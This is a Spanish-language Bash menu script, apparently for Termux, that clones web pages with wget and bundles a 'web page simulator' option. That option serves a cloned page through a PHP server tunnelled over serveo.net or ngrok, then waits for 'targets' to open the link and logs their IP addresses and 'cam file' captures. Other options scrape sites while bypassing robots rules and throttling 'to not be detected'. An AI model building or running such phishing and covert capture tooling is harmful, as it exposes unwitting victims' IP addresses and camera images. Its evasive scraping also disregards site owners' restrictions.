#!/bin/bash
#-----------------
red='\033[1;31m'
rset='\033[0m'
grn='\033[1;32m'
orange='\033[40m'
ylo='\033[1;33m'
blue='\033[1;34m'
cyan='\033[1;36m'
pink='\033[1;35m'
Gris='\033[0;37m'
cyan='\e[0;36m'
lightcyan='\e[96m'
green='\e[0;32m'
lightgreen='\e[1;32m'
white='\e[1;37m'
red='\e[1;31m'
yellow='\e[1;33m'
blue='\e[1;34m'
Escape="\033";
white="${Escape}[0m";
GreenF="${Escape}[32m";
LighGreenF="${Escape}[92m"
YellowF="${Escape}[33m";
BlueF="${Escape}[34m";
CyanF="${Er5scape}[36m";
Reset="${Escape}[0m";
pe='\033[0;35m'
#-----------------
clear
reset
while :
do
echo '	
╔███╗  ╔███╗ ╔█████╗ ╔██████╗  ╔███████╗   
║██║║██║║██║ ██╔══██╗║██║  ║██ ║██╔════
║██║║██║║██║ ███████║║██║  ║██ ║███████║
║██║╚══╝║██║ ██╔══██║║██║  ║██ ║██╔════  
║██║    ║██║ ██║  ██║║██████║  ║███████║    
╚══╝    ╚══╝ ╚═╝  ╚═╝╚══════╝  ╚═══════╝V1.1
'| lolcat -a -d 20
echo "Este script esta hecho con fines educativo"
echo  '  "Autor LUIGUI"'|lolcat
echo -e "$grn ＞>>＞$ylo [Options]$grn ＜<<<＜＜$rset"
echo " "
echo " "
echo -e "$grn [1] $cyan Copiar el interfast de una pagina html"
echo -e "$grn [2] $cyan Copiar una pagina completa de html vulnerando robot"
echo -e "$grn [3] $cyan Copiar html aun con restricciones"
echo -e "$grn [4] $cyan Copiar html con limite de velocidad para no ser detectado"
echo -e "$grn [5] $cyan Verificar el texto o Html"
echo -e "$grn [6] $cyan Ver linia de codigo"
echo -e "$grn [7] $cyan Modificar Html o texto"
echo -e "$grn [8] $cyan Crear texto o Html"
echo -e "$grn [9] $cyan Simulador de pagian web"
echo -e "$grn [10] $cyan Copiar el html o texto"
echo -e "$grn [11] $cyan Mover el html o texto"
echo -e "$grn [12] $cyan Copiar carpeta"
echo -e "$grn [13] $cyan Mover carpeta"
echo -e "$grn [14] $cyan Exit"
echo " "
echo " "

  echo -e "\e[1;31m┌─[\e[0m""\e[1;37mIngresa opcion:\e[0m""\e[1;31m]\e[0m"
  read -p $'\e[1;31m└──╼\e[0m\e[1;92m ' x
  case $x in
    1)
      echo -e "\e[1;31m┌─[\e[0m""\e[1;37mIngresa pagina:\e[0m""\e[1;31m]\e[0m"
      read -p $'\e[1;31m└──╼\e[0m\e[1;92m ' my_var 
      echo -n "Desea poner nombre a al archivo(y/n)? "
      read answer1
      clear 
      if [ "$answer1" != "${answer1#[Yy]}" ];then
      echo -e "\e[1;31m┌─[\e[0m""\e[1;37mIngresa el nombre con txt o html:\e[0m""\e[1;31m]\e[0m" 
      read -p $'\e[1;31m└──╼\e[0m\e[1;92m ' my_var6
      wget $my_var -O $my_var6 -o /dev/null
      sleep 3
      echo "Eso es todo, en unos minutos esto finalizara"| lolcat -a -d 20
      sleep 3
      clear
      else
      if [ "$answer1" != "${answer1#[Nn]}" ];then
      wget $my_var -O index.html -o /dev/null
      sleep 5
      echo "Eso es todo, en unos minutos esto finalizara"| lolcat -a -d 20
      sleep 3
	clear
	fi
	fi
      ;;
    2)
	 echo -e "\e[1;31m┌─[\e[0m""\e[1;37mIngresa la pagina:\e[0m""\e[1;31m]\e[0m"
         read -p $'\e[1;31m└──╼\e[0m\e[1;92m ' my_var8
         wget  -r -p -U Mozilla $my_var8 
         echo "Eso es todo, en unos minutos esto finalizara"| lolcat -a -d 20
         sleep 3
	 clear
    ;;
    3)
	 echo -e "\e[1;31m┌─[\e[0m""\e[1;37mIngresa la pagina:\e[0m""\e[1;31m]\e[0m"
         read -p $'\e[1;31m└──╼\e[0m\e[1;92m ' my_var9
         wget -r -k $my_var9 
         echo "Eso es todo, en unos minutos esto finalizara"| lolcat -a -d 20
         sleep 3
	 clear
    ;;
    4)
	 echo -e "\e[1;31m┌─[\e[0m""\e[1;37mIngresa la pagina:\e[0m""\e[1;31m]\e[0m"
         read -p $'\e[1;31m└──╼\e[0m\e[1;92m ' my_var10
         wget --wait=20 --limit-rate=20K -r -p -U Mozilla $my_var10 
         echo "Eso es todo, en unos minutos esto finalizara"| lolcat -a -d 20
         sleep 3
	 clear
    ;;

    5)
	echo -e "\e[1;31m┌─[\e[0m""\e[1;37mPonga el nombre:\e[0m""\e[1;31m]\e[0m"
        read -p $'\e[1;31m└──╼\e[0m\e[1;37m ' my_var3
	ls -l $my_var3
	sleep 5
        clear
      ;;
    6)

       echo -e "\e[1;31m┌─[\e[0m""\e[1;37mIngresa el nombre :\e[0m""\e[1;31m]\e[0m" 
       read -p $'\e[1;31m└──╼\e[0m\e[1;37m ' my_var4
       grep 'href=' $my_var4
       sleep 10
       clear
      ;;
   7)
     echo -e "\e[1;31m┌─[\e[0m""\e[1;37mIngresa el nombre con txt o html:\e[0m""\e[1;31m]\e[0m" 
     read -p $'\e[1;31m└──╼\e[0m\e[1;37m ' my_var7
          nano $my_var7
	clear
    ;;
   8)
	nano
	clear
    ;;

   9)
	stop() {
checkngrok=$(ps aux | grep -o "ngrok" | head -n1)
checkphp=$(ps aux | grep -o "php" | head -n1)
checkssh=$(ps aux | grep -o "ssh" | head -n1)
if [[ $checkngrok == *'ngrok'* ]]; then
pkill -f -2 ngrok > /dev/null 2>&1
killall -2 ngrok > /dev/null 2>&1
fi

if [[ $checkphp == *'php'* ]]; then
killall -2 php > /dev/null 2>&1
fi
if [[ $checkssh == *'ssh'* ]]; then
killall -2 ssh > /dev/null 2>&1
fi
exit 1

}

dependencies() {


command -v php > /dev/null 2>&1 || { echo >&2 "I require php but it's not installed. Install it. Aborting."; exit 1; }
 


}

catch_ip() {

ip=$(grep -a 'IP:' ip.txt | cut -d " " -f2 | tr -d '\r')
IFS=$'\n'
printf "\e[1;93m[\e[0m\e[1;77m+\e[0m\e[1;93m] IP:\e[0m\e[1;77m %s\e[0m\n" $ip

cat ip.txt >> saved.ip.txt


}

checkfound() {

printf "\n"
printf "\e[1;92m[\e[0m\e[1;77m*\e[0m\e[1;92m] Waiting targets,\e[0m\e[1;77m Press Ctrl + C to exit...\e[0m\n"
while [ true ]; do


if [[ -e "ip.txt" ]]; then
printf "\n\e[1;92m[\e[0m+\e[1;92m] Target opened the link!\n"
catch_ip
rm -rf ip.txt

fi

sleep 0.5

if [[ -e "Log.log" ]]; then
printf "\n\e[1;92m[\e[0m+\e[1;92m] Cam file received!\e[0m\n"
rm -rf Log.log
fi
sleep 0.5

done 

}


server() {

command -v ssh > /dev/null 2>&1 || { echo >&2 "I require ssh but it's not installed. Install it. Aborting."; exit 1; }

printf "\e[1;77m[\e[0m\e[1;93m+\e[0m\e[1;77m] Starting Serveo...\e[0m\n"

if [[ $checkphp == *'php'* ]]; then
killall -2 php > /dev/null 2>&1
fi

if [[ $subdomain_resp == true ]]; then

$(which sh) -c 'ssh -o StrictHostKeyChecking=no -o ServerAliveInterval=60 -R '$subdomain':80:localhost:3333 serveo.net  2> /dev/null > sendlink ' &

sleep 8
else
$(which sh) -c 'ssh -o StrictHostKeyChecking=no -o ServerAliveInterval=60 -R 80:localhost:3333 serveo.net 2> /dev/null > sendlink ' &

sleep 8
fi
printf "\e[1;77m[\e[0m\e[1;33m+\e[0m\e[1;77m] Starting php server... (localhost:3333)\e[0m\n"
fuser -k 3333/tcp > /dev/null 2>&1
php -S localhost:3333 > /dev/null 2>&1 &
sleep 3
send_link=$(grep -o "https://[0-9a-z]*\.serveo.net" sendlink)
printf '\e[1;93m[\e[0m\e[1;77m+\e[0m\e[1;93m] Direct link:\e[0m\e[1;77m %s\n' $send_link

}


payload_ngrok() {

link=$(curl -s -N http://127.0.0.1:4040/api/tunnels | grep -o "https://[0-9a-z]*\.ngrok.io")
sed 's+forwarding_link+'$link'+g' $my_va1 > index2.html
sed 's+forwarding_link+'$link'+g' template.php > index.php


}

ngrok_server() {


if [[ -e ngrok ]]; then
echo ""
else
command -v unzip > /dev/null 2>&1 || { echo >&2 "I require unzip but it's not installed. Install it. Aborting."; exit 1; }
command -v wget > /dev/null 2>&1 || { echo >&2 "I require wget but it's not installed. Install it. Aborting."; exit 1; }
printf "\e[1;92m[\e[0m+\e[1;92m] Downloading Ngrok...\n"
arch=$(uname -a | grep -o 'arm' | head -n1)
arch2=$(uname -a | grep -o 'Android' | head -n1)
if [[ $arch == *'arm'* ]] || [[ $arch2 == *'Android'* ]] ; then
wget https://bin.equinox.io/c/4VmDzA7iaHb/ngrok-stable-linux-arm.zip > /dev/null 2>&1

if [[ -e ngrok-stable-linux-arm.zip ]]; then
unzip ngrok-stable-linux-arm.zip > /dev/null 2>&1
chmod +x ngrok
rm -rf ngrok-stable-linux-arm.zip
else
printf "\e[1;93m[!] Download error... Termux, run:\e[0m\e[1;77m pkg install wget\e[0m\n"
exit 1
fi

else
wget https://bin.equinox.io/c/4VmDzA7iaHb/ngrok-stable-linux-386.zip > /dev/null 2>&1 
if [[ -e ngrok-stable-linux-386.zip ]]; then
unzip ngrok-stable-linux-386.zip > /dev/null 2>&1
chmod +x ngrok
rm -rf ngrok-stable-linux-386.zip
else
printf "\e[1;93m[!] Download error... \e[0m\n"
exit 1
fi
fi
fi

printf "\e[1;92m[\e[0m+\e[1;92m] Starting php server...\n"
php -S 127.0.0.1:3333 > /dev/null 2>&1 & 
sleep 2
printf "\e[1;92m[\e[0m+\e[1;92m] Starting ngrok server...\n"
./ngrok http 3333 > /dev/null 2>&1 &
sleep 10

link=$(curl -s -N http://127.0.0.1:4040/api/tunnels | grep -o "https://[0-9a-z]*\.ngrok.io")
printf "\e[1;92m[\e[0m*\e[1;92m] Direct link:\e[0m\e[1;77m %s\e[0m\n" $link

payload_ngrok
checkfound
}

start1() {
if [[ -e sendlink ]]; then
rm -rf sendlink
fi

printf "\n"
printf "\e[1;92m[\e[0m\e[1;77m01\e[0m\e[1;92m]\e[0m\e[1;93m Serveo.net\e[0m\n"
printf "\e[1;92m[\e[0m\e[1;77m02\e[0m\e[1;92m]\e[0m\e[1;93m Ngrok\e[0m\n"
default_option_server="1"
echo -e "\e[1;31m┌─[\e[0m""\e[1;37mIngresa opcion:\e[0m""\e[1;31m]\e[0m"
 read -p $'\e[1;31m└──╼\e[0m\e[1;92m '  option_server
option_server="${option_server:-${default_option_server}}"
echo -e "\e[1;31m┌─[\e[0m""\e[1;37mIngresa pagina:\e[0m""\e[1;31m]\e[0m"
read -p $'\e[1;31m└──╼\e[0m\e[1;92m ' my_va1 
if [[ $option_server -eq 1 ]]; then

command -v php > /dev/null 2>&1 || { echo >&2 "I require ssh but it's not installed. Install it. Aborting."; exit 1; }
start

elif [[ $option_server -eq 2 ]]; then
ngrok_server
else
printf "\e[1;93m [!] Invalid option!\e[0m\n"
sleep 1
clear
start1
fi

}


payload() {

send_link=$(grep -o "https://[0-9a-z]*\.serveo.net" sendlink)

sed 's+forwarding_link+'$send_link'+g' $my_va1 > index2.html

}

start() {

default_choose_sub="Y"
default_subdomain="grabcam$RANDOM"

printf '\e[1;33m[\e[0m\e[1;77m+\e[0m\e[1;33m] Choose subdomain? (Default:\e[0m\e[1;77m [Y/n] \e[0m\e[1;33m): \e[0m'
read choose_sub
choose_sub="${choose_sub:-${default_choose_sub}}"
if [[ $choose_sub == "Y" || $choose_sub == "y" || $choose_sub == "Yes" || $choose_sub == "yes" ]]; then
subdomain_resp=true
printf '\e[1;33m[\e[0m\e[1;77m+\e[0m\e[1;33m] Subdomain: (Default:\e[0m\e[1;77m %s \e[0m\e[1;33m): \e[0m' $default_subdomain
read subdomain
subdomain="${subdomain:-${default_subdomain}}"
fi

server
payload
checkfound

}
dependencies
start1

    ;;
    10)
	echo -n "Usted guardo en carpeta (y/n)? "
	read answer
        if [ "$answer" != "${answer#[Yy]}" ] ;then
	clear 
         echo -e "\e[1;31m┌─[\e[0m""\e[1;37mIngresa el nombre de la carpeta:\e[0m""\e[1;31m]\e[0m"
         read -p $'\e[1;31m└──╼\e[0m\e[1;92m ' my_var12
         echo -e "\e[1;31m┌─[\e[0m""\e[1;37mIngresa el nombre del texto o html:\e[0m""\e[1;31m]\e[0m"
         read -p $'\e[1;31m└──╼\e[0m\e[1;92m ' my_var13
	 cp $my_var12/$my_var13 /sdcard/
	 reset
         else
         echo -e "\e[1;31m┌─[\e[0m""\e[1;37mIngresa el nombre del texto o html:\e[0m""\e[1;31m]\e[0m"
         read -p $'\e[1;31m└──╼\e[0m\e[1;92m ' my_var14
	 cp $my_var14 /sdcard/
	 reset
         fi
    ;;
   11)
	echo -n "Usted guardo en carpeta (y/n)? "
	read answer33
        if [ "$answer33" != "${answer33#[Yy]}" ] ;then
	clear 
         echo -e "\e[1;31m┌─[\e[0m""\e[1;37mIngresa el nombre de la carpeta:\e[0m""\e[1;31m]\e[0m"
         read -p $'\e[1;31m└──╼\e[0m\e[1;92m ' my_var17
         echo -e "\e[1;31m┌─[\e[0m""\e[1;37mIngresa el nombre del texto o html:\e[0m""\e[1;31m]\e[0m"
         read -p $'\e[1;31m└──╼\e[0m\e[1;92m ' my_var16
	 mv $my_var17/$my_var16 /sdcard/
	 reset
         else
         echo -e "\e[1;31m┌─[\e[0m""\e[1;37mIngresa el nombre del texto o html:\e[0m""\e[1;31m]\e[0m"
         read -p $'\e[1;31m└──╼\e[0m\e[1;92m ' my_var15
	 mv $my_var15 /sdcard/
         reset
         fi
	 
      ;;
     12)
	echo -e "\e[1;31m┌─[\e[0m""\e[1;37mIngresa el nombre de la carpeta:\e[0m""\e[1;31m]\e[0m"
         read -p $'\e[1;31m└──╼\e[0m\e[1;92m ' my_var18
		cp $my_var18 /sdcard/
	reset
     ;;
    13)
	 echo -e "\e[1;31m┌─[\e[0m""\e[1;37mIngresa el nombre de la carpeta:\e[0m""\e[1;31m]\e[0m"
         read -p $'\e[1;31m└──╼\e[0m\e[1;92m ' my_var19
	 mv $my_var19 /sdcard/
      reset
    ;;

   14)
	exit
	clear
    ;;
    *)
      echo Comando invalido \"$x\"
     sleep 3
	reset
      ;;
  esac
done
